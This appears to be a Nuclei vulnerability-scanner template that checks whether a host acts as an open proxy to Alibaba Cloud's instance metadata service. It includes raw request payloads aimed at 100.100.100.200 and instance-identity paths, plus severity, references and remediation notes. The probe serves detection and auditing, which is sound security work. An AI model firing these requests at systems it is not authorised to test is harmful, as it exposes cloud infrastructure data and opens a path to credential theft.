http:
- attack: clusterbomb
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"serial-number"'
    - '"zone-id":"'
  payloads:
    hostval:
    - alibaba.oast.pro
    - 100.100.100.200
    path:
    - latest/dynamic/instance-identity/document
    - 2016-01-01/dynamic/instance-identity/document
  raw:
  - 'GET http://{{hostval}}/{{path}} HTTP/1.1

    Host: {{hostval}}


    '
  unsafe: true
id: metadata-service-alibaba
info:
  author: sullo,pwnhxl
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
    cvss-score: 9.3
    cwe-id: CWE-441
  description: The Alibaba host is configured as a proxy which allows access to the
    metadata service. This could allow significant access to the host/infrastructure.
  metadata:
    max-request: 4
  name: Alibaba Metadata Service Check
  reference:
  - https://www.alibabacloud.com/help/doc-detail/108460.htm
  - https://blog.projectdiscovery.io/abusing-reverse-proxies-metadata/
  - https://www.mcafee.com/blogs/enterprise/cloud-security/how-an-attacker-could-use-instance-metadata-to-breach-your-app-in-aws/
  remediation: Disable the proxy or restrict configuration to only allow access to
    approved hosts/ports. Upgrade to IMDSv2 if possible.
  severity: critical
  tags: exposure,config,alibaba,proxy,misconfig,metadata,vuln
